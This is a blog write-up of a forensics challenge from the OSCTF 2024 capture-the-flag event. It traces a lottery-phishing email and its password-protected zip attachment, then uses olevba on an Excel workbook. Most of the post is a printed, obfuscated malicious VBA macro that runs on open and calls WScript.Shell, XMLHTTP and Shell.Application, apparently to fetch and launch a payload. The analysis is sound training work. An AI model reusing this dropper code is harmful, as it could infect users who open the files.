---
title: "OSCTF"
description: "Migrated from Astro"
icon: "article"
date: "2024-07-14"
lastmod: "2024-07-14"
draft: false
toc: true
weight: 999
---

In this CTF, I was shocked to know the ages of some of the organizers. Crazy, we have people in high-school [10th onwards] conducting International CTFs on a zero budget. Really Impressive as hell. Shout-out to `@$h1kh4r` and `@Inv1s1bl3`. Well we, `H7Tex` placed 9th overall. It's a bummer we weren't able to get into the prize division. Let’s get into it.

```bash
Authors: AbuCTF, PattuSai, SHL, MrGhost, MrRobot, Rohmat
```

## Forensics

### FOR101

**Description**: 

An employee of MDSV company received a lottery winning letter. Because of greed, that employee opened that email and as a result, the company's computer was attacked. Luckily, the SOC department was able to capture the disk image and blockade that employee's computer. Your task is to conduct investigation, analysis and retrieve the flag.

**Challenge file**:

[Drive Link](https://drive.google.com/file/d/1PF9DFZoNhb61bs3k0kcuyFEe5U_kA7LR/view)

**Author**: `@Anhshidou`

Quite an interesting challenge, that involves going through an entire Windows C directory and finding the right target to further enumerate.

 

```bash
┌──(abu㉿Abuntu)-[<>/OSCTF/forensics/Big]
└─$ ls -la
total 816748
drwxrwxrwx 1 abu abu       512 Jul 13 20:52 .
drwxrwxrwx 1 abu abu       512 Jul 14 11:51 ..
-rwxrwxrwx 1 abu abu 417587928 Jul 13 19:15 Users.zip
```

We’ve been given this massive file, which we need to unzip and proceed with playing around. At first, I fell into the rabbit hole of investigating `NTUSER.DAT` files. But that didn’t go so well, so I searched around a bit more and found some interesting stuff.

```bash
┌──(abu㉿Abuntu)-[<>/extractedFiles/Users/Administrator/Downloads/Outlook Files]
└─$ file Notifications.eml
Notifications.eml: multipart/mixed; boundary="===============1582594319==", ASCII text, with CRLF line terminators
```

Here’s something on `EML files`, An EML file is an email message saved by an email application such as Microsoft Outlook, Windows Mail, or Apple Mail. These files are formatted according to the MIME (Multipurpose Internet Mail Extensions) RFC 822 standard, allowing them to be compatible with various email clients. 

```bash
└─$ cat Notifications.eml
Content-Type: multipart/mixed; boundary="===============1582594319=="
MIME-Version: 1.0
From: mmb1234@example.com
To: maikanizumi@example.com
Subject: Credit Card For Free

--===============1582594319==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

You have won $10,000. I have sent you a credit card containing your bonus. 
Because this is a gift of great value, it will be kept confidential. 
Password is CreditsCardForFree
--===============1582594319==
Content-Type: application/octet-stream
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="CreditsCard.zip"

UEsDBBQACQBjAHqQ6Fgjz4wWgd0FAATrBQAOAAsAQ3JlZGl0czY5Lnhsc20BmQcAAQBBRQMIALCJ
haRRXhXXhdwy9Ql6IXQgIO4ovBCASOLtQUM0nDO2NjbgjTdHMrqMwlFb88f474QaR6UAZ8wLmO85
Mvn4RQUoXFP3ry4BGkRi1V8Tmf7baZeBJKYHC7EmLhqkWtzsduispUUr+9bSgLngwvZi3GTJVFrb
09Mq9xu2ke5U+OMEqpIOvxxIb7qvKCKrEQF2llS4Spa4iYGPzx25wbsdpU9Prvq6fvPJTF1K60zD
AEUAZZVZsxxQyE1e4WQHce5g3JgpV0X3e5l25bABVHjpMu+X851phm3QClEZqRTwQn4Q1vlbkaRm
hQPjON7U+A+vQfJL8fqOIVbpVgdD18IT0iU1cpoS6Cu5dTY6Ldra9SUu9TcVJO7qIE/PlqZsQil0
5E9rt7le+zjpaaBLorwPqTooFg+A/n0jJzlHLg0spqu6r90srYI/9N
```

We get the above message and also get raw bytes for a zip file named `CreditsCard.zip`. Quick Disclaimer, this challenge seemed to be copied from a different event and the funniest thing is the author was also a participant of the event. Shout-out to `@bquanman` for making this awesome challenge. 

You can either use `cyberchef` or just use the `echo` command to convert the raw bytes into a zip file.

{{< figure src="1.png" alt="1" >}}

Now, go ahead and unzip the file.

```bash
└─$ 7z x download.zip -pCreditsCardForFree

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 384585 bytes (376 KiB)

Extracting archive: download.zip
--
Path = download.zip
Type = zip
Physical Size = 384585

Everything is Ok

Size:       387844
Compressed: 384585
```

{{< figure src="2.png" alt="p4" >}}

This notification popped up almost instantly! That’s because I use a `WSL2` , so just go ahead and allow this specific file in Windows Security.

```bash
└─$ file Credits69.xlsm
Credits69.xlsm: Microsoft Excel 2007+
```

{{< figure src="3.png" alt="p4" >}}

We find an `xlsm` file with `macros` . So, onwards with `Oletools`. Specially `Olevba` .

```bash
└─$ olevba
olevba 0.60.2 on Python 3.11.9 - https://decalage.info/python/oletools

olevba.py

olevba is a script to parse OLE and OpenXML files such as MS Office documents
(e.g. Word, Excel), to extract VBA Macro code in clear text, deobfuscate
and analyze malicious macros.
XLM/Excel 4 Macros are also supported in Excel and SLK files.

Supported formats:
    - Word 97-2003 (.doc, .dot), Word 2007+ (.docm, .dotm)
    - Excel 97-2003 (.xls), Excel 2007+ (.xlsm, .xlsb)
```

Running it, gives a us a huge list of suspicious scripts and strings.

 

```bash
└─$ olevba --decode --deobf Credits69.xlsm
olevba 0.60.2 on Python 3.11.9 - https://decalage.info/python/oletools
===============================================================================
FILE: Credits69.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------
-------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |DocumentOpen        |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|adodb.stream        |May create a text file                       |
|Suspicious|SaveToFile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|microsoft.xmlhttps   |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA obfuscated      |VBA string expressions were detected, may be |
|          |Strings             |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|'\x01#Eg'       |0123456789abcdef                             |
|Hex String|'\x00\x02\x08\x19'  |00020819                                     |
|Hex String|'\x00\x00\x00\x00\x0|000000000046                                 |
|          |0F'                 |                                             |
|Hex String|'\x00\x02\x08 '     |00020820                                     |
|VBA string|200                 |Chr(50) + Chr(48) + Chr(48)                  |
+----------+--------------------+---------------------------------------------+
```

So, the point is to be able to investigate what the following malicious macro script was doing.

```bash
VBA MACRO Module1.bas
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub Auto_Open()
Workbook_Open
End Sub
Sub AutoOpen()
Workbook_Open
End Sub
Sub WorkbookOpen()
Workbook_Open
End Sub
Sub Document_Open()
Workbook_Open
End Sub
Sub DocumentOpen()
Workbook_Open
End Sub
Function ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨(µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨)
¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»· = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂĂÄÅ̉ÓÔƠÖÙÛÜàáâăäåØ¶§Ú¥"
»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢ = "ăXL1lYU~Ùä,Ca²ZfĂ@dO-cq³áƠsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(̉Sw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
For y = 1 To Len(µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨)
¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬¯¨³³¿¯© = InStr(¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·, Mid(µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨, y, 1))
If ¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬¯¨³³¿¯© > 0 Then
¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®« = Mid(»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢, ¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬¯¨³³¿¯©, 1)
¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£» = ¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£» + ¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«
Else
¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£» = ¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£» + Mid(µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨, y, 1)
End If
Next
ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨ = ¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»
For ³§½¢º¹¸°¾»´¦§¢·¬»´¦³²¦¦·°¶¥°¯¾µ·§½µº¦¶»¹²¥¦¥·²¢¥³°§°¹¾¾£½©¼°¥«ª§¡¹¶° = 1 To Len(®¶®¾ª¼¿¢·¥»°¾£º¤¿º·¡¦ª¹¹¾´°¢²¶©»°´¢«°µ¸¶¥¤·«½¿¢´¹º¡º»º¸®µ»³¸µ»¦¦½¨¾¾¨¦²)
®¶®¾ª¼¿¢·¥»°¾£º¤¿º·¡¦ª¹¹¾´°¢²¶©»°´¢«°µ¸¶¥¤·«½¿¢´¹º¡º»º¸®µ»³¸µ»¦¦½¨¾¾¨¦² = ³§½¢º¹¸°¾»´¦§¢·¬»´¦³²¦¦·°¶¥°¯¾µ·§½µº¦¶»¹²¥¦¥·²¢¥³°§°¹¾¾£½©¼°¥«ª§¡¹¶°
Next
For ¥½µ©¡»¡·¤¼¶µ¢¾·½¼¾®¦»»¼¬§ª¦·°¹·³¹¸¤µ³³¡¢£§´¤´¹¨´¡¾¦¬°¹¦¼¥°¡³» = 2 To Len(£©©³¶º©«®®·º¿¿°µ·¡º·«½ª¾¢¢µ¥¹¾²ª¤°¥©½®¥³µ¯¶¹¹´·¹³½²µ£²·¬·¿³¤¹´¨¢º§¯²¦)
£©©³¶º©«®®·º¿¿°µ·¡º·«½ª¾¢¢µ¥¹¾²ª¤°¥©½®¥³µ¯¶¹¹´·¹³½²µ£²·¬·¿³¤¹´¨¢º§¯²¦ = 2
Next
For »´¦¾¨¶¶½»¿º©³¬µ³°¶¢µ¼²¢°·¸¤¾¨»£¼¡»¥¹¼¤·©©³¹§¾¸¢·¤·¼ºµ£· = 3 To Len(»¶ª¨½©ª¾»¼§µ¨®º¾¢°¦»»¬¥§»¡¬·»¥¾¥¤½°·¾¢²³¡¹¾³¢µ¾·¹«¬¸¼´³£¥°µ»«½°®¸)
»¶ª¨½©ª¾»¼§µ¨®º¾¢°¦»»¬¥§»¡¬·»¥¾¥¤½°·¾¢²³¡¹¾³¢µ¾·¹«¬¸¼´³£¥°µ»«½°®¸ = »´¦¾¨¶¶½»¿º©³¬µ³°¶¢µ¼²¢°·¸¤¾¨»£¼¡»¥¹¼¤·©©³¹§¾¸¢·¤·¼ºµ£·
Next
For ¹®µ´¾¥»³ºª´¡¹®¶¶®¦·³«¢¢¢¹µ¹½¸¦§¥§·°°¡µ¼¤¿©¦¸£¥¥¹¦¶¨¹«©§µ¡´²·°º¢·¡¸²µ¤°²³¯£«¶£ = 4 To Len(´³®½£¼µ·©¡¤¨®º²§¿»²¹£°»¦¾¹²²³¡¨«¯°»³¸¢»¹²£»´£¬¦º¸¸³¾½¨¡º¥¬¥«¹·§¶¶°¦«¹¥¤·)
´³®½£¼µ·©¡¤¨®º²§¿»²¹£°»¦¾¹²²³¡¨«¯°»³¸¢»¹²£»´£¬¦º¸¸³¾½¨¡º¥¬¥«¹·§¶¶°¦«¹¥¤· = 2
Next
End Function
Sub Workbook_Open()
Dim ¹·³«»½¦¨¬¢¸°¤¼¾£¬»¢¾´¢¢µ¾¡¥»»«·¸»µ´¾¼¶»²¥§©¥¥¾¿¼¿²µ°¤²£¹´¶§ As Object
Dim ¦¡º¾¿°®¹½º°¡£¿¡¢³´º¥¦²¤°°·¥®½½¡¶«¥¸¹«©·¬°·®¶£³¬§§¹°«µ©¹¢´¥ª¾¾¸»¹©§²·°¢ª¸¢£¡ As String
Dim ¤¸¿º«¡¬¡°µ²¢¹¾¿¡¼²¥¾®¨¶µ»¾«º½¼»ª²¢¾ª¤»¹¬»¾»¸¤µµ°¡§¬¿§¢¥§¥£¶¢¥©¨ As String
Dim §»¶¬¡¦¹³¾¸¸³££¹´´¸³¥¦´¢¹¥··£°¿²»º¶°°¥©²¢°¾ª«°©«®·½½··´®¹°µµ©½½§¥·°»¢¼¼´¡¦¡«¹ As String
Dim ¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ As Integer
¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ = Chr(50) + Chr(48) + Chr(48)
Set ¹·³«»½¦¨¬¢¸°¤¼¾£¬»¢¾´¢¢µ¾¡¥»»«·¸»µ´¾¼¶»²¥§©¥¥¾¿¼¿²µ°¤²£¹´¶§ = CreateObject("WScript.Shell")
¦¡º¾¿°®¹½º°¡£¿¡¢³´º¥¦²¤°°·¥®½½¡¶«¥¸¹«©·¬°·®¶£³¬§§¹°«µ©¹¢´¥ª¾¾¸»¹©§²·°¢ª¸¢£¡ = ¹·³«»½¦¨¬¢¸°¤¼¾£¬»¢¾´¢¢µ¾¡¥»»«·¸»µ´¾¼¶»²¥§©¥¥¾¿¼¿²µ°¤²£¹´¶§.SpecialFolders("AppData")
Dim ¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼
Dim ´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦
Dim ¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬¯¨³³¿¯©¶
Dim ³§½¢º¹¸°¾»´¦§¢·¬»´¦³²¦¦·°¶¥°¯¾µ·§½µº¦¶»¹²¥¦¥·²¢¥³°§°¹¾¾£½©¼°¥«ª§¡¹¶° As Long
Dim ¥½µ©¡»¡·¤¼¶µ¢¾·½¼¾®¦»»¼¬§ª¦·°¹·³¹¸¤µ³³¡¢£§´¤´¹¨´¡¾¦¬°¹¦¼¥°¡³» As String
Dim ¿¨¡©§¾¡º·¼½µ¡®¾¥¼½«¹´¥¥¶²°»¤¡·»°¬£°¿¥§¬¸©º¢¾¥·´£¹¥¡½¬¸ª´º°»§¬¥¡£¢¦»·¶ As Long
Dim »¶ª¨½©ª¾»¼§µ¨®º¾¢°¦»»¬¥§»¡¬·»¥¾¥¤½°·¾¢²³¡¹¾³¢µ¾·¹«¬¸¼´³£¥°µ»«½°®¸ As String
Dim »´¦¾¨¶¶½»¿º©³¬µ³°¶¢µ¼²¢°·¸¤¾¨»£¼¡»¥¹¼¤·©©³¹§¾¸¢·¤·¼ºµ£· As Long
Dim ¹®µ´¾¥»³ºª´¡¹®¶¶®¦·³«¢¢¢¹µ¹½¸¦§¥§·°°¡µ¼¤¿©¦¸£¥¥¹¦¶¨¹«©§µ¡´²·°º¢·¡¸²µ¤°²³¯£«¶£ As String
Dim °»»¦¡½º®¤¼º¬³¤³º¸¶®¨½®©µ«¢´¾´··¦«º¬º°¥²ª¹«¿º¼£º·¦¢¬°¢¾§µ²° As String
Dim £©©³¶º©«®®·º¿¿°µ·¡º·«½ª¾¢¢µ¥¹¾²ª¤°¥©½®¥³µ¯¶¹¹´·¹³½²µ£²·¬·¿³¤¹´¨¢º§¯²¦ As Long
Dim ³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬
Dim ²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥
Dim ¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡ As Integer
Dim ³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²
Dim ®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©
¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡ = 1
Range("A1").Value = ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨("4BEiàiuP3x6¿QEi³")
Dim ½¹¢²°½¢¼¬µ¥¨³¹²¡£½¬¿´¥ºµ¢ª¥°¸¢¶«µ§¥°°¤µ¸µ¾¦°¹¾¥¹»»·¡¾²°£¬¼·´©·¡·©¾³§¦¤·¶¨¹º°¹©§©££»¥¡¢¾¤ As String
´¸®¢»¬«¢®¼¿¾«²¡»¦°´»·°º¥ª¡½½¤§»´ª§¥¸»®«¶¿¸¶¢³µ¶¾¿¼£²¡¾«¹¶¹§ºµº¦¶¹¦¨¸®¸§¹µ³¢£¯©¦¾·º£¼º²»¨®²¦¤¦·½»¶³ = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "̉xP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiP̉Ü_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
½¹¢²°½¢¼¬µ¥¨³¹²¡£½¬¿´¥ºµ¢ª¥°¸¢¶«µ§¥°°¤µ¸µ¾¦°¹¾¥¹»»·¡¾²°£¬¼·´©·¡·©¾³§¦¤·¶¨¹º°¹©§©££»¥¡¢¾¤ = ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨(´¸®¢»¬«¢®¼¿¾«²¡»¦°´»·°º¥ª¡½½¤§»´ª§¥¸»®«¶¿¸¶¢³µ¶¾¿¼£²¡¾«¹¶¹§ºµº¦¶¹¦¨¸®¸§¹µ³¢£¯©¦¾·º£¼º²»¨®²¦¤¦·½»¶³)
MsgBox ½¹¢²°½¢¼¬µ¥¨³¹²¡£½¬¿´¥ºµ¢ª¥°¸¢¶«µ§¥°°¤µ¸µ¾¦°¹¾¥¹»»·¡¾²°£¬¼·´©·¡·©¾³§¦¤·¶¨¹º°¹©§©££»¥¡¢¾¤, vbInformation, ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
Dim ¢¶¸¡³·´®¨½¥¡¼»´§²¾½º¢¿°°¹¹££©´¢©¹ª¬»¡¡°º·«¶²¦¾²¦¹º¤¹¼»«»¬º¤¸½¥¹¬²§¶°¾·»§©¥ª As Date
Dim ¹»«´¾¹¡º¸¿°·¶¥µ¢µ¾²¦¥§¶¨´²½°·£®·»ª¡¬¬»½µ³©·»¾¤·¹¤µ®º¤¸§¶·¢·¹º££§¬¸ As Date
¢¶¸¡³·´®¨½¥¡¼»´§²¾½º¢¿°°¹¹££©´¢©¹ª¬»¡¡°º·«¶²¦¾²¦¹º¤¹¼»«»¬º¤¸½¥¹¬²§¶°¾·»§©¥ª = Date
¹»«´¾¹¡º¸¿°·¶¥µ¢µ¾²¦¥§¶¨´²½°·£®·»ª¡¬¬»½µ³©·»¾¤·¹¤µ®º¤¸§¶·¢·¹º££§¬¸ = DateSerial(2024, 7, 8)
If ¢¶¸¡³·´®¨½¥¡¼»´§²¾½º¢¿°°¹¹££©´¢©¹ª¬»¡¡°º·«¶²¦¾²¦¹º¤¹¼»«»¬º¤¸½¥¹¬²§¶°¾·»§©¥ª < ¹»«´¾¹¡º¸¿°·¶¥µ¢µ¾²¦¥§¶¨´²½°·£®·»ª¡¬¬»½µ³©·»¾¤·¹¤µ®º¤¸§¶·¢·¹º££§¬¸ Then
Set ³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸² = CreateObject("microsoft.xmlhttps")
Set ²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥ = CreateObject("Shell.Application")
³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬ = ¦¡º¾¿°®¹½º°¡£¿¡¢³´º¥¦²¤°°·¥®½½¡¶«¥¸¹«©·¬°·®¶£³¬§§¹°«µ©¹¢´¥ª¾¾¸»¹©§²·°¢ª¸¢£¡ + ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨("\k¿i6Ü_~Bb@")
